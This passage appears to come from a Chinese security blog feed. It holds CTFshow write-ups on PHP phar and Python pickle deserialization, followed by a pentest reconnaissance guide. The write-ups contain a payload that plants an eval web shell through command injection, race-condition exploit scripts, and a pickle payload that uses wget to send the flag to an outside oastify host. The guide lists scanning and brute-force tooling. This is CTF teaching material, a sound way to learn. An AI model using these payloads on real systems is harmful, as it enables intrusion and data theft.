single-quoted-string">'rm '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">filter</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">checkevil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">copy</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'DOCUMENT_ROOT'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'work done'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'where is flag?'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><code>__destruct()</code>加了条件，但是<code>admin</code>不可控</p><p><a href="https://xz.aliyun.com/t/2715?time__1311=n4+xni0=G=GQ=DKi==Ds0ffrYGCSDBmiDchrYD">初探phar:&#x2F;&#x2F;</a></p><p>首先构造 <code>phar</code> 的文件，将 <code>filter</code> 存储在 <code>meta-data</code> 中以备反序列化。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">filter</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"a;echo '&lt;?php @eval(\$_POST[1]); ?>' > shell.php"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filecontent</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$evilfile</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"payload.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"payload.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后缀名必须为phar</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub</span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">filter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义的meta-data存入manifest</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span><span class="token comment">//签名自动计算</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"done."</span><span class="token punctuation">;</span></span></code></pre><p>然后因为文件名加上 <code>/var/www/html/</code> 后 <code>unlink</code> 的参数就会有两遍路径，删不掉，就可以持久化上传文件了，当然也可以通过条件竞争去反序列化这个 <code>phar</code>。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://39afeb37-98e3-49cc-9a59-ba48da61ff09.challenge.ctf.show/"</span>target <span class="token operator">=</span> <span class="token string">"/var/www/html/d.phar"</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"CTFshow\php-unserialize\payload.phar"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    payload <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>_ <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span></span><span class="token string">/?fn=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>target<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span>target <span class="token operator">=</span> <span class="token string">"phar://d.phar/test"</span>_ <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span></span><span class="token string">/?fn=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>target<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></code></pre><p>条件竞争</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> threadingurl<span class="token operator">=</span><span class="token string">"https://39afeb37-98e3-49cc-9a59-ba48da61ff09.challenge.ctf.show/"</span>f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"CTFshow\php-unserialize\payload.phar"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span>content<span class="token operator">=</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">#上传1.phar，内容是本地文件：phar.phar</span>    requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"?fn=d.phar"</span><span class="token punctuation">,</span>data<span class="token operator">=</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">#利用条件竞争，尝试phar://反序列化1.phar，1.phar没被删除就能被反序列化，因而就能执行system()函数从而执行我们的命令</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"?fn=phar://d.phar/test"</span><span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token string">"1=system('tac flag.php)"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"ctfshow&#123;"</span><span class="token keyword">in</span> r<span class="token punctuation">.</span>text <span class="token keyword">or</span> <span class="token string">"flag&#123;"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    t1<span class="token operator">=</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>upload<span class="token punctuation">)</span>    t2<span class="token operator">=</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">)</span>    t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    t2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h4 id="web277-python反序列化"><a href="#web277-python反序列化" class="headerlink" title="web277(python反序列化)"></a>web277(python反序列化)</h4><p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">Python 反序列化漏洞</a></p><p>利用burp的Collaborator外带</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> os<span class="token keyword">import</span> base64<span class="token keyword">class</span> <span class="token class-name">hsad</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'wget npgr48shkll6h9ye92srk1po7fd71xpm.oastify.com/?a=`tac flag`'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>hsad<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="web277.png" loading="lazy"></p><h4 id="web278"><a href="#web278" class="headerlink" title="web278"></a>web278</h4><p>同 <code>web277</code>，禁用了 <code>os.system</code> 但不影响 <code>os.popen</code>。</p>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> php-unserialize </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="/2024/07/07/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2024/07/07/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h4 id="信息收集内容"><a href="#信息收集内容" class="headerlink" title="信息收集内容"></a>信息收集内容</h4><p>在划定了测试范围之后，就需要进入信息收集阶段。在这个阶段，渗透人员需要使用各种公开资源尽可能地获取测试目标的相关信息。他们搜集信息的互联网渠道主要有：论坛&#x2F;公告板&#x2F;新闻组&#x2F;媒体文章&#x2F;博客&#x2F;社交网络&#x2F;github&#x2F;其他商业或非商业性的网站。此外，他们也可以借助各种搜索引擎中获取相关数据，如谷歌、雅虎、MSN必应、百度等。收集的信息主要包括:</p><p>（1）收集目标网站服务器信息：域名、子域名、CNAME、cdn、真实IP、系统类型、版本等；</p><p>（2）识别并收集目标网站指纹信息：CMS、中间件、网页编程语言等及其通用漏洞调查收集；</p><p>（3）扫描并收集目标网站目录结构：一些文件可以访问获得信息、后台管理页面位置、日志位置等；</p><p>（4）网站的敏感信息：</p><p>whois信息、姓名、备案、邮箱、电话反查（邮箱丢社工库，社工准备等）；<br>弱口令扫描、密码爆破等（如针对系统管理员、网站后台管理员、数据库管理员等）；<br>网站源码是否泄露等，如github源码。<br>（5）收集目标服务器主机端口信息：不同端口提供不同的攻击思路和方向；</p><p>（6）网络防护信息：网络边界设备或网络节点设备，如有没有防火墙，有没有IPS、IDS或WAF，网络行为管理，全流量分析。</p><p>收集的信息越多，渗透测试成功的概率越高。<br>在信息收集中，最主要的就是收集服务器的配置信息和网站的敏感信息，其中包括域名及子域名信息、目标网站系统、CMS指纹、目标网站真实IP 、开放的端口等。换句话说，只要是与目标网站相关的信息，我们都应该去尽量搜集。</p><h4 id="域名相关信息"><a href="#域名相关信息" class="headerlink" title="域名相关信息"></a>域名相关信息</h4><p>知道目标的域名之后，我们要做的第一件事就是获取域名的注册信息，注意关注该域名的注册商和注册人的联系方式（电话和邮箱）等信息。</p><h5 id="域名分类"><a href="#域名分类" class="headerlink" title="域名分类"></a>域名分类</h5><p>国际域名：.com(商业公司);:net(网络服务):.org(组织协会等);.gov(政府部门);.edu(教育机构);.mil(军事领域);.int(国际组织)</p><p>国别域名：.CN代表中国，.UK代表英国，.US代表美国　</p><p>新顶级域名：biz,info，name，pro, aero, coop, museum…</p><h5 id="域名信息查询方式"><a href="#域名信息查询方式" class="headerlink" title="域名信息查询方式"></a>域名信息查询方式</h5><h6 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h6><p>Whois是一个标准的互联网协议， 可用于收集域名注册信息，注册的域名、IP地址等信息。简单来说， Whois就是一个用于查询域名是否</p><p>己被注册以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。</p><p>在Whois查询中，得到注册人的姓名和邮箱信息通常对测试个人站点非常有用，因为我们可以通过搜索引擎和社交网络挖掘出域名所有人</p><p>的很多信息。对中小站点而言，域名所有人往往就是管理员。</p><ul><li><strong>Kali系统</strong>：在Kali系统中， Whois 己经默认安装，只需输入要查询的域名即可，代码为<code>whois+域名</code>（一般域名不包含主机名，如</li></ul><p>·baidu.com）。注意，Kali系统需连接真实网络，能上网。</p><ul><li><strong><a href="https://whois.chinaz.com/">站长之家</a></strong></li><li><strong><a href="https://whois.aliyun.com/">阿里云查询</a></strong></li></ul><h6 id="反查"><a href="#反查" class="headerlink" title="反查"></a>反查</h6><p><a href="https://whois.chinaz.com/reverse/">邮箱反查 注册人反查 电话反查</a></p><h6 id="备案信息查询"><a href="#备案信息查询" class="headerlink" title="备案信息查询"></a>备案信息查询</h6><ul><li><strong><a href="https://www.beianx.cn/">ICP备案查询网</a></strong></li><li><strong><a href="http://www.tianyancha.como/">天眼查</a></strong></li><li><strong><a href="https://beian.miit.gov.cn/?wm=gwo#/Integrated/index">ICP&#x2F;IP地址&#x2F;域名信息备案管理系统</a></strong></li></ul><h5 id="子域名信息查询方式"><a href="#子域名信息查询方式" class="headerlink" title="子域名信息查询方式"></a>子域名信息查询方式</h5><p>子域名也就是二级域名， 是指顶级域名下的域名。假设我们的目标网络规模比较大，直接从主域入手显然是很不理智的， 因为对于这种</p><p>规模的目标， 一般其主域都是重点防护区域，所以不如先进入目标的某个子域，然后再想办法迂回接近真正的目标，这无疑是个比较好</p><p>的选择。</p><ul><li><p><strong><a href="https://searchdns.netcraft.com/">What’s that site running?</a></strong></p></li><li><p><strong><a href="https://github.com/euphrat1ca/LayerDomainFinder">Layer子域名挖掘机</a></strong></p></li><li><p><strong><a href="https://github.com/aboul3la/Sublist3r">Sublist3r</a></strong></p></li><li><p><strong><a href="https://github.com/lijiejie/subDomainsBrute">subDomainsBrute</a></strong></p></li><li><p><strong>Google语法  site:xxx.com</strong></p></li><li><p><strong><a href="https://crt.sh/">证书透明度公开曰志枚举</a></strong></p></li></ul><h4 id="IP相关信息"><a href="#IP相关信息" class="headerlink" title="IP相关信息"></a>IP相关信息</h4><ul><li><p><strong><a href="http://ip.chinaz.com/">IP查询</a></strong></p></li><li><p><strong><a href="https://ip.chinaz.com/linksip">同IP查询</a></strong></p></li><li><p><strong><a href="https://www.maxmind.com/en/home">IP经纬度</a></strong></p></li></ul><h4 id="端口服务相关信息"><a href="#端口服务相关信息" class="headerlink" title="端口服务相关信息"></a>端口服务相关信息</h4><p>查看本机端口</p><p>Windows：netstat -aon|findstr 3306</p><p>Linux: netstat -an|grep 3306 </p><p>远程机器端口</p><p>telnet 192.168.142.137 80 </p><p>wget 192.168.142.137 80 </p><p>nc -vz 192.168.142.137 445</p><h5 id="常见端口及漏洞"><a href="#常见端口及漏洞" class="headerlink" title="常见端口及漏洞"></a>常见端口及漏洞</h5><h6 id="文件共享服务"><a href="#文件共享服务" class="headerlink" title="文件共享服务"></a>文件共享服务</h6><table><thead><tr><th align="center">端口号</th><th>端口说明</th><th>攻击方向</th></tr></thead><tbody><tr><td align="center">21&#x2F;22&#x2F;69</td><td>FTP&#x2F;SFTP文件传输协议</td><td>允许匿名上传、下载、爆破和嗅探操作</td></tr><tr><td align="center">2049</td><td>NFS服务（NetworkFileSystem）</td><td>配置不当</td></tr><tr><td align="center">139</td><td>Samba服务</td><td>爆破、未授权访问、远程代码和执行</td></tr><tr><td align="center">389</td><td>LDAP目录访问协议</td><td>注入、允许匿名访问、弱口令</td></tr></tbody></table><h6 id="远程连接服务端口"><a href="#远程连接服务端口" class="headerlink" title="远程连接服务端口"></a>远程连接服务端口</h6><table><thead><tr><th align="center">端口号</th><th>端口说明</th><th>攻击方向</th></tr></thead><tbody><tr><td align="center">22</td><td>SSH远程连接</td><td>爆破、SSH隧道及内网代理转发 文件传输</td></tr><tr><td align="center">23</td><td>Telnet远程连接</td><td>爆破、嗅探、弱口令</td></tr><tr><td align="center">3389</td><td>RDP远程桌面连接</td><td>Shift后门（WindowsServer2003以下的系统）、爆破</td></tr><tr><td align="center">5900</td><td>VNC</td><td>弱口令爆破</td></tr><tr><td align="center">5632</td><td>PcAnywhere远程控制服务</td><td>抓密码、代码执行</td></tr></tbody></table><h6 id="数据库服务端口"><a href="#数据库服务端口" class="headerlink" title="数据库服务端口"></a>数据库服务端口</h6><table><thead><tr><th>端口号</th><th>端口说明</th><th>攻击方向</th></tr></thead><tbody><tr><td>3306</td><td>MySQL</td><td>注入、提权、爆破</td></tr><tr><td>1433</td><td>MSSQL数据库</td><td>注入、提权、SA弱口令</td></tr><tr><td>1521</td><td>Oracle数据库</td><td>TNS爆破、注入、反弹shell</td></tr><tr><td>5432</td><td>PostgreSQL数据库</td><td>爆破、注入、弱口令</td></tr><tr><td>27017&#x2F;27018</td><td>MongoDB</td><td>爆破、未授权访问</td></tr><tr><td>6379</td><td>Redis数据库</td><td>可尝试未授权访问、弱口令爆破</td></tr><tr><td>5000</td><td>Sysbase&#x2F;DB2数据库</td><td>爆破、注入</td></tr></tbody></table><h6 id="邮件服务端口"><a href="#邮件服务端口" class="headerlink" title="邮件服务端口"></a>邮件服务端口</h6><table><thead><tr><th>端口号</th><th>端口说明</th><th>攻击方向</th></tr></thead><tbody><tr><td>25</td><td>SMTP邮件服务</td><td>邮件伪造</td></tr><tr><td>110</td><td>POP3协议</td><td>爆破、嗅探</td></tr><tr><td>143</td><td>IMAP协议</td><td>爆破</td></tr></tbody></table><h6 id="网络常见协议端口"><a href="#网络常见协议端口" class="headerlink" title="网络常见协议端口"></a>网络常见协议端口</h6><table><thead><tr><th>端口号</th><th>端口说明</th><th>攻击方向</th></tr></thead><tbody><tr><td>53</td><td>DNS域名系统</td><td>允许区域传送、DNS劫持  缓存投毒、欺骗</td></tr><tr><td>67&#x2F;68</td><td>DHCP服务</td><td>劫持、欺骗</td></tr><tr><td>161</td><td>SNMP协议</td><td>爆破、搜集目标内网信息</td></tr></tbody></table><h6 id="特殊服务端口"><a href="#特殊服务端口" class="headerlink" title="特殊服务端口"></a>特殊服务端口</h6><table><thead><tr><th>端口号</th><th>端口说明</th><th>攻击方向</th></tr></thead><tbody><tr><td>2181</td><td>Zookeeper服务</td><td>未授权访问</td></tr><tr><td>8069</td><td>Zabbix服务</td><td>远程执行、SQL注入</td></tr><tr><td>9200&#x2F;9300</td><td>Elasticsearch服务</td><td>远程执行</td></tr><tr><td>11211</td><td>Memcached服务</td><td>未授权访问</td></tr><tr><td>512&#x2F;513&#x2F;514</td><td>LinuxRexec服务</td><td>爆破、rlogin登录</td></tr><tr><td>873</td><td>Rsync服务</td><td>匿名访问、文件上传</td></tr><tr><td>3690</td><td>SVN服务</td><td>SVN泄露、未授权访问</td></tr><tr><td>50000</td><td>SAPManagementConsole</td><td>远程执行</td></tr></tbody></table><h5 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h5><p>Nmap （Network Mapper <a href="https://nmap.org/">https://nmap.org/</a></p><p>1）扫描主机(HostiDiscovery)</p><p>2）扫描端口(Port Scanning）</p><p>3）探测操作系统、软件版本（Operating System Detection、Version Detection)</p><p>参数类型</p><p>nmap–help</p><ul><li><p>TARGETSPECIFICATIOM:自标，对什么进行扫描，比如是域名、TP或者网络</p></li><li><p>HOSTDISCOVERY:主机发现，怎么对主机进行扫描，比如简单扫描，还是全部，扫一遍，或者用相应的协议扫</p></li><li><p>SCANTECHNIOQUES：扫描技术，协议日勺设置</p></li><li><p>PORTSPECIFICATIONANDSCANORDER:端口和扫描顺序设置 SERVICEVERSIONDETECTION:服务和版本识别</p></li><li><p>SCRIPT SCAN:使用脚本，nmap本身内置了大量的lua脚本，而且还可以自己编写脚本</p></li><li><p>OS DETECTION:操作系统识别</p></li><li><p>TIMING AND PERFORMANCE:时间和性能设置，比如扫描频率、重试次数等等 FIREWALL&#x2F;IDS EVASION AND SPOOFING:防火墙绕过和欺骗，比如使用代理假IP等</p></li><li><p>OUTPUT:把扫描接出输出到文件 MISC：启用IPv6等等配置</p></li></ul><p>nmap本身内置了大量的lua脚本，而且还可以自己已编写脚本 </p><p>Is &#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&#x2F; I wc -1</p><p>全部清单：<a href="https://nmap.org/book/nse.html">Nmap Scripting Engine</a></p><p>例如：</p><p>nmap 192.168.142.137 –script http-enum 列举HTTP服务</p><p>nmap–script&#x3D;auth绕过鉴权 </p><p>nmap–script&#x3D;brute 暴力破解 nmap –script&#x3D;vuln 扫描漏洞</p><h4 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h4><p><strong>识别对象</strong></p><ol><li>CMS信息：比如Discuz、织梦、帝国CMS、PHPCMS、ECshop等</li><li>前端技术：比如HTML5、jquery、bootstrap、Vue、ace等;</li><li>开发语言：比如PHP、Java、Ruby、Python、C#等;</li><li>Web服务器：比如Apache、 Nginx、IIS、lighttpd等;</li><li>应用服务器：比如Tomcat、Jboss、Weblogic、Websphere等;</li><li>操作系统信息：比如Linux、win2k8、win7、Kali、Centos等;</li><li>CDN信息：是否使用CDN，如cloudflare、帝联、蓝讯、网宿、七牛云、阿里云等；</li><li>WAF信息：是否使用WAF，如D盾、云锁、宝塔、安全狗、360等</li></ol><h5 id="CMS指纹识别"><a href="#CMS指纹识别" class="headerlink" title="CMS指纹识别"></a>CMS指纹识别</h5><p>内容管理系统</p><p>Content Management System</p><p>通过关键特征器、开发语言、版本等等</p><p>识别出月标的CMS系统、服务操作系统、CDN、WAF的类别</p><h6 id="常见的CMS"><a href="#常见的CMS" class="headerlink" title="常见的CMS"></a><strong>常见的CMS</strong></h6><p>博客（比如CSDN、博客园）、微博、站、导航网站（hao123）、信息分类（知乎）、商城、百科…．　</p><p>问答网站、企业官网、学校官网、医院官网、团购网(58）</p><p><img src="CMS.png" loading="lazy"></p><h6 id="各类网站开源CMS"><a href="#各类网站开源CMS" class="headerlink" title="各类网站开源CMS"></a><strong>各类网站开源CMS</strong></h6><ul><li>企业建站系统：Metlnfo(米拓)、蝉知、SiteServer CMS等;</li><li>B2C商城系统：商派Shopex、ECshop、HiShop、XpShop等</li><li>门户建站系统：DedeCMS(织梦)、帝国CMS、PHPCMS、动易CmsTop等;</li><li>博客系统：WordPress、Z-Blog等</li><li>论坛社区：Discuz、PHPwind、WeCenter等</li><li>问答系统：Tipask、whatsns等</li><li>知识百科系统：HDwiki;</li><li>B2B门户系统：Destoon、B2Bbuilder、友邻B2B等</li><li>人才招聘网站系统：骑士CMS、PHP云人才管理系统</li><li>房产网站系统：FangCms等;</li><li>在线教育建站系统：Kesion、EduSoho;</li><li>电影网站系统：苹果cMS、ctcms、movcms等</li><li>小说文学建站系统：杰奇CMS</li></ul><h6 id="CMS指纹识别思路"><a href="#CMS指纹识别思路" class="headerlink" title="CMS指纹识别思路"></a>CMS指纹识别思路</h6><p>版权信息、特定文件MD5值、查看网页源代码、通过特定文件分析</p><h6 id="CMS识别工具"><a href="#CMS识别工具" class="headerlink" title="CMS识别工具"></a>CMS识别工具</h6><ul><li>whatweb(kali)</li><li>浏览器插件</li><li><ul><li><a href="https://www.wappalyzer.com/">Wappalyzer</a></li><li><a href="https://www.whatruns.com/">whatruns</a></li></ul></li><li>在线网站</li><li><ul><li><a href="http://finger.tidesec.com/">潮汐指纹识别</a></li></ul></li><li>离线网站</li><li><ul><li>御剑指纹扫描器(需要.NET Framework）</li><li>Test404轻量CMS指纹识别v2.1</li><li><a href="https://github.com/Tuhinshubhra/CMSeeK">CMSeek</a></li></ul></li></ul><h5 id="CDN指纹识别"><a href="#CDN指纹识别" class="headerlink" title="CDN指纹识别"></a>CDN指纹识别</h5><ul><li>(超级)ping</li><li>nslookup</li><li>ldb(load balance detector  Kali)</li><li>国内：</li><li><ul><li><a href="http://cdn.chinaz.com/">各地CDN节点测速结果 - CDN云观测 - 站长工具</a></li></ul></li><li>国外：</li><li><ul><li><a href="https://www.cdnplanet.com/tools/cdnfinder/">CDN Finder</a></li></ul></li><li>脚本：</li><li><ul><li><a href="https://github.com/boy-hack/w8fuckcdn/">w8Fuckcdn</a> </li><li><a href="https://github.com/3xp10it/xcdn">xcdn</a></li></ul></li></ul><h5 id="WAF指纹识别"><a href="#WAF指纹识别" class="headerlink" title="WAF指纹识别"></a>WAF指纹识别</h5><p>Web. Application Firewall Web 应用防火墙</p><p>过滤HTTP&#x2F;HTTPS的请求</p><h6 id="WAF的作用"><a href="#WAF的作用" class="headerlink" title="WAF的作用"></a>WAF的作用</h6><ul><li><p>SQL Injection (SQLi)：阻止SQL注入</p></li><li><p>Cross Site Scripting (XSS)：阻止跨站脚本攻击</p></li><li><p>Local File Inclusion (LFI)： 阻正止利用本地文件包含漏洞进行攻击</p></li><li><p>Remote File Inclusione(RFl)：阻止利用远程文件包含漏洞进行攻击</p></li><li><p>Remote Code Execution(RCE)：阻正止利用远程命令执行漏洞进行攻击 PHP Code Injectiod：阻正止PHP代码注入</p></li><li><p>HTTP Protocol Violations：阻止违反HTTP协议的恶意访问</p></li><li><p>HTTPoXy：阻止利用远程代理感染漏洞进行攻击 Sshllshock：阻止利用Shellshock漏洞进行攻击</p></li><li><p>Session Fixation： 阻止利用Session会话iD不变的漏洞进行攻击 ScannerDetection：阻止黑客扫描网站</p></li><li><p>Metadata&#x2F;ErrorLeakages：阻止源代码&#x2F;错误信息泄露 Project Honey Pot Blacklist：蜜罐项目黑名单</p></li><li><p>GeolP Country Blocking：根据判断IP地址归属地来进行IP阻断</p></li></ul><h6 id="WAF分类"><a href="#WAF分类" class="headerlink" title="WAF分类"></a>WAF分类</h6><p>硬件型WAF厂商安装）</p><p>云WAF（阿里云、腾讯云、华为云.. ）</p><p>软件型 WAF（部署在 Apache、Nginx 等 HTTPServer中）</p><h6 id="常见WAF厂商"><a href="#常见WAF厂商" class="headerlink" title="常见WAF厂商"></a>常见WAF厂商</h6><p>各种云：阿里云、腾讯云、华为云、百度云</p><p>安全狗、宝塔、360、知道创宇、长亭、安恒、</p><h6 id="WAF识别思路"><a href="#WAF识别思路" class="headerlink" title="WAF识别思路"></a>WAF识别思路</h6><ul><li><p>额外的cookie;</p></li><li><p>任何响应或请求的附加标头;</p></li><li><p>响应内容（如果被阻止请求）</p></li><li><p>响应代码（如果被阻止请求）</p></li><li><p>IP地址（云WAF）；</p></li><li><p>JS客户端模块（客户端WAF）</p></li></ul><h6 id="WAF触发拦截方式"><a 